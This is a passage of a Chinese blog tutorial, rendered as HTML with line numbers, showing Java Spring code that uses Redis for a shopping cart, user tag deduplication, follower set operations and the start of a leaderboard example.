class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CartItemVO</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 商品id</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer productId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 购买数量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer buyNum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 商品标题</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String productTitle;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 图片</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String productImg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 商品单价</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> price ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 总价格，单价+数量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> totalPrice;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getProductId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> productId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setProductId</span><span class="params">(<span class="keyword">int</span> productId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.productId = productId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getBuyNum</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> buyNum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBuyNum</span><span class="params">(Integer buyNum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.buyNum = buyNum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getProductTitle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> productTitle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setProductTitle</span><span class="params">(String productTitle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.productTitle = productTitle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getProductImg</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> productImg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setProductImg</span><span class="params">(String productImg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.productImg = productImg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 商品单价 * 购买数量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getTotalPrice</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.price*<span class="keyword">this</span>.buyNum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPrice</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPrice</span><span class="params">(<span class="keyword">int</span> price)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTotalPrice</span><span class="params">(<span class="keyword">int</span> totalPrice)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.totalPrice = totalPrice;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>CartIVO</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CartVO</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 购物项</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;CartItemVO&gt; cartItems;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 购物车总价格</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer totalAmount;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 总价格</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getTotalAmount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cartItems.stream().mapToInt(CartItemVO::getTotalPrice).sum();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;CartItemVO&gt; <span class="title">getCartItems</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cartItems;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCartItems</span><span class="params">(List&lt;CartItemVO&gt; cartItems)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cartItems = cartItems;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>数据源层</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VideoDao</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Map&lt;Integer,VideoDO&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        map.put(<span class="number">1</span>,<span class="keyword">new</span> VideoDO(<span class="number">1</span>,<span class="string">"工业级PaaS云平台+SpringCloudAlibaba 综合项目实战(完结)"</span>,<span class="string">"https://xdclass.net"</span>,<span class="number">1099</span>));</span><br><span class="line">        map.put(<span class="number">2</span>,<span class="keyword">new</span> VideoDO(<span class="number">2</span>,<span class="string">"玩转新版高性能RabbitMQ容器化分布式集群实战"</span>,<span class="string">"https://xdclass.net"</span>,<span class="number">79</span>));</span><br><span class="line">        map.put(<span class="number">3</span>,<span class="keyword">new</span> VideoDO(<span class="number">3</span>,<span class="string">"新版后端提效神器MybatisPlus+SwaggerUI3.X+Lombok"</span>,<span class="string">"https://xdclass.net"</span>,<span class="number">49</span>));</span><br><span class="line">        map.put(<span class="number">4</span>,<span class="keyword">new</span> VideoDO(<span class="number">4</span>,<span class="string">"玩转Nginx分布式架构实战教程 零基础到高级"</span>,<span class="string">"https://xdclass.net"</span>,<span class="number">49</span>));</span><br><span class="line">        map.put(<span class="number">5</span>,<span class="keyword">new</span> VideoDO(<span class="number">5</span>,<span class="string">"ssm新版SpringBoot2.3/spring5/mybatis3"</span>,<span class="string">"https://xdclass.net"</span>,<span class="number">49</span>));</span><br><span class="line">        map.put(<span class="number">6</span>,<span class="keyword">new</span> VideoDO(<span class="number">6</span>,<span class="string">"新一代微服务全家桶AlibabaCloud+SpringCloud实战"</span>,<span class="string">"https://xdclass.net"</span>,<span class="number">59</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 模拟从数据库找</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> videoId</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> VideoDO <span class="title">findDetailById</span><span class="params">(<span class="keyword">int</span> videoId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(videoId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>json工具类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JsonUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义jackson对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ObjectMapper MAPPER = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将对象转换成json字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">objectToJson</span><span class="params">(Object data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String string = MAPPER.writeValueAsString(data);</span><br><span class="line">            <span class="keyword">return</span> string;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将json结果集转化为对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> jsonData json数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz 对象中的object类型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">jsonToPojo</span><span class="params">(String jsonData, Class&lt;T&gt; beanType)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            T t = MAPPER.readValue(jsonData, beanType);</span><br><span class="line">            <span class="keyword">return</span> t;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>添加购物车接口</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"addCart"</span>)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> JsonData <span class="title">addCart</span><span class="params">(<span class="keyword">int</span> videoId,<span class="keyword">int</span> buyNum)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//获取购物车</span></span><br><span class="line">       BoundHashOperations&lt;String, Object, Object&gt; myCart = getMyCartOps();</span><br><span class="line"></span><br><span class="line">       Object cacheObj = myCart.get(videoId+<span class="string">""</span>);</span><br><span class="line">       String result = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (cacheObj != <span class="keyword">null</span>) &#123;</span><br><span class="line">           result = (String) cacheObj;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (cacheObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="comment">//不存在则新建一个购物项</span></span><br><span class="line">           CartItemVO cartItem = <span class="keyword">new</span> CartItemVO();</span><br><span class="line">           <span class="comment">//从数据库查询详情，我们这边直接随机写个</span></span><br><span class="line"></span><br><span class="line">           VideoDO videoDO = videoDao.findDetailById(videoId);</span><br><span class="line">           videoDO.setId(videoId);</span><br><span class="line"></span><br><span class="line">           cartItem.setPrice(videoDO.getPrice());</span><br><span class="line">           cartItem.setBuyNum(buyNum);</span><br><span class="line">           cartItem.setProductId(videoId);</span><br><span class="line">           cartItem.setProductImg(videoDO.getImg());</span><br><span class="line">           cartItem.setProductTitle(videoDO.getTitle());</span><br><span class="line">           myCart.put(videoId+<span class="string">""</span>, JsonUtil.objectToJson(cartItem));</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">           <span class="comment">//存在则新增数量</span></span><br><span class="line">           CartItemVO cartItem = JsonUtil.jsonToPojo(result, CartItemVO<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">           cartItem.setBuyNum(cartItem.getBuyNum() + buyNum);</span><br><span class="line">           myCart.put(videoId+<span class="string">""</span>, JsonUtil.objectToJson(cartItem));</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> JsonData.buildSuccess();</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li>购物车方法抽取</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 抽取我的购物车通用方法</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> BoundHashOperations&lt;String, Object, Object&gt; <span class="title">getMyCartOps</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String cartKey = getCartKey();</span><br><span class="line">    <span class="keyword">return</span> redisTemplate.boundHashOps(cartKey);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取购物车的key</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getCartKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//从拦截器获取，这里写死即可，每个用户不一样</span></span><br><span class="line">    <span class="keyword">int</span> userId = <span class="number">88</span>;</span><br><span class="line">    String cartKey = String.format(<span class="string">"product:cart:%s"</span>, userId);</span><br><span class="line">    <span class="keyword">return</span> cartKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>查看我的购物车</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/mycart"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> JsonData <span class="title">findMyCart</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    BoundHashOperations&lt;String,Object,Object&gt; myCart = getMyCartOps();</span><br><span class="line">    List&lt;Object&gt; itemList = myCart.values();</span><br><span class="line">    List&lt;CartItemVO&gt; cartItemVOList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span>(Object item: itemList)&#123;</span><br><span class="line">        CartItemVO cartItemVO = JsonUtil.jsonToPojo((String)item,CartItemVO<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        cartItemVOList.add(cartItemVO);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//封装成cartvo</span></span><br><span class="line">    CartVO cartVO = <span class="keyword">new</span> CartVO();</span><br><span class="line">    cartVO.setCartItems(cartItemVOList);</span><br><span class="line">    <span class="keyword">return</span> JsonData.buildSuccess(cartVO);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>清空购物车</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/clear"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> JsonData <span class="title">clear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String cartKey = getCartKey();</span><br><span class="line">    redisTemplate.delete(cartKey);</span><br><span class="line">    <span class="keyword">return</span> JsonData.buildSuccess();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="分布缓存实战-Set集合数据结构最佳案例实战"><a href="#分布缓存实战-Set集合数据结构最佳案例实战" class="headerlink" title="分布缓存实战-Set集合数据结构最佳案例实战"></a>分布缓存实战-Set集合数据结构最佳案例实战</h1><h2 id="案例实战之大数据下的用户画像标签去重"><a href="#案例实战之大数据下的用户画像标签去重" class="headerlink" title="案例实战之大数据下的用户画像标签去重"></a>案例实战之大数据下的用户画像标签去重</h2><ul><li>介绍<ul><li>用户画像 英文为User Profile，是根据用户基本属性、社会属性、行为属性、心理属性等真实信息而抽象出的一个标签化的、虚拟的用户模型。“用户画像”的实质是对 “人”的数字化。</li><li>应用场景有很多，比如个性化推荐、精准营销、金融风控、精细化运营等等， 举个例子来理解用户画像的实际应用价值，我们经常用手机网购，淘宝里面的千人千面</li><li>通过“标签 tag”来对用户的多维度特征进行提炼和标识，那每个人的用户画像就需要存储，set集合就适合去重</li><li>用户画像不止针对某个人，也可以某一人群或行业的画像</li><li>利用redis可以很好的去重</li></ul></li><li>案例</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BoundSetOperations operations  = redisTemplate.boundSetOps(<span class="string">"user:tags:1"</span>);</span><br><span class="line"></span><br><span class="line">operations.add(<span class="string">"car"</span>,<span class="string">"student"</span>,<span class="string">"rich"</span>,<span class="string">"guangdong"</span>,<span class="string">"dog"</span>,<span class="string">"rich"</span>);</span><br><span class="line"></span><br><span class="line">Set&lt;String&gt; set1 = operations.members();</span><br><span class="line"></span><br><span class="line">System.out.println(set1);</span><br><span class="line"></span><br><span class="line">operations.remove(<span class="string">"dog"</span>);</span><br><span class="line"></span><br><span class="line">Set&lt;String&gt; set2 = operations.members();</span><br><span class="line">System.out.println(set2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> JsonData.buildSuccess();</span><br></pre></td></tr></table></figure><h2 id="案例实战社交应用里面之关注、粉丝、共同好友案例"><a href="#案例实战社交应用里面之关注、粉丝、共同好友案例" class="headerlink" title="案例实战社交应用里面之关注、粉丝、共同好友案例"></a>案例实战社交应用里面之关注、粉丝、共同好友案例</h2><ul><li>代码</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSet</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    BoundSetOperations operationLW  = redisTemplate.boundSetOps(<span class="string">"user:lw"</span>);</span><br><span class="line"></span><br><span class="line">    operationLW.add(<span class="string">"A"</span>,<span class="string">"B"</span>,<span class="string">"C"</span>,<span class="string">"D"</span>,<span class="string">"E"</span>);</span><br><span class="line">    System.out.println(<span class="string">"老王的粉丝:"</span>+operationLW.members());</span><br><span class="line">    BoundSetOperations operationXD  = redisTemplate.boundSetOps(<span class="string">"user:xd"</span>);</span><br><span class="line"></span><br><span class="line">    operationXD.add(<span class="string">"A"</span>,<span class="string">"B"</span>,<span class="string">"F"</span>,<span class="string">"G"</span>,<span class="string">"H"</span>,<span class="string">"J"</span>);</span><br><span class="line">    System.out.println(<span class="string">"小D的粉丝:"</span>+operationXD.members());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//差集</span></span><br><span class="line">    Set lwSet = operationLW.diff(<span class="string">"user:xd"</span>);</span><br><span class="line">    System.out.println(<span class="string">"老王的优势:"</span>+lwSet);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//差集</span></span><br><span class="line">    Set xdSet = operationXD.diff(<span class="string">"user:lw"</span>);</span><br><span class="line">    System.out.println(<span class="string">"小滴的优势:"</span>+xdSet);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//交集</span></span><br><span class="line">    Set interSet =  operationLW.intersect(<span class="string">"user:xd"</span>);</span><br><span class="line">    System.out.println(<span class="string">"共同好友:"</span>+interSet);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//并集</span></span><br><span class="line">    Set unionSet = operationLW.union(<span class="string">"user:xd"</span>);</span><br><span class="line">    System.out.println(<span class="string">"两个人的并集:"</span>+unionSet);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//用户A是否是 老王 的粉丝</span></span><br><span class="line">    <span class="keyword">boolean</span> flag = operationLW.isMember(<span class="string">"A"</span>);</span><br><span class="line">    System.out.println(flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="案例实战之SortedSet开发用户积分实时榜单最佳实践"><a href="#案例实战之SortedSet开发用户积分实时榜单最佳实践" class="headerlink" title="案例实战之SortedSet开发用户积分实时榜单最佳实践"></a>案例实战之SortedSet开发用户积分实时榜单最佳实践</h2><ul><li>背景<ul><li>用户玩游戏-积分实时榜单</li><li>IT视频热销实时榜单</li><li>电商商品热销实时榜单</li><li>一般的排行榜读多写少，可以对 master 进行写入操作，然后多个 slave 进行读取操作。</li><li>如果是对象记得重写HashCode与Equals方法</li></ul></li><li>对象准备</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserPointVO</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserPointVO</span><span class="params">(String username, String phone)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        <span class="keyword">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    